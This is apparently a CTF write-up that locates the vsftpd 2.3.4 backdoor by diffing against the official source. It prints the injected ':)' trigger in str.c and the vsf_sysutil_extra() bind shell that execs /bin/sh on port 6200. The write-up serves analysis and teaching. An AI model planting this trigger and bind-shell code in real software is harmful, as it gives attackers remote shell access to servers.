# vsftpd Backdoor

> Author : jul0105
> Date : 13.03.2021



## Challenge info

**Release** : Bundle 2 (13.03)

**Difficulty** : Novice

**Goal** : Find the backdoor.



## Solve

1. Downloaded and uncompressed the vsftpd archive given in the challenge
2. Downloaded and uncompressed a vsftpd archive with the same version (2.3.4) from https://github.com/dagwieers/vsftpd/releases/tag/2.3.4
3. Using `diff`, I compared the two directories to see if any file differs :

```
diff -r vsftpd-2.3.4 vsftpd-2.3.4-backdoor  
```

Result : difference in two files (`str.c` and `sysdeputil.c`).



4. File `str.c`, 5 lines added on the function `str_contains_space` :

```c
int
str_contains_space(const struct mystr* p_str)
{
  unsigned int i;
  for (i=0; i < p_str->len; i++)
  {
    if (vsf_sysutil_isspace(p_str->p_buf[i]))
    {
      return 1;
    }
      /* diff start */
    else if((p_str->p_buf[i]==0x3a)
    && (p_str->p_buf[i+1]==0x29))
    {
      vsf_sysutil_extra();
    }
      /* diff end*/

  }
  return 0;
}

```

**The 5 lines added check if the current character and the next one are `:)`. If this is the case the function `vsf_sysutil_extra()` is called (see next file).**



5. File `sysdeputil.c`, function `vsf_sysutil_extra` added :

```c
int
vsf_sysutil_extra(void)
{
  int fd, rfd;
  struct sockaddr_in sa;
  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
  exit(1);
  memset(&sa, 0, sizeof(sa));
  sa.sin_family = AF_INET;
  sa.sin_port = htons(6200);
  sa.sin_addr.s_addr = INADDR_ANY;
  if((bind(fd,(struct sockaddr *)&sa,
  sizeof(struct sockaddr))) < 0) exit(1);
  if((listen(fd, 100)) == -1) exit(1);
  for(;;)
  {
    rfd = accept(fd, 0, 0);
    close(0); close(1); close(2);
    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
    execl("/bin/sh","sh",(char *)0);
  }
}
```

**This new functions create a socket binded to a shell (`/bin/sh`). This is the backdoor that allow a hacker to get a remote shell on the vsftpd server.**

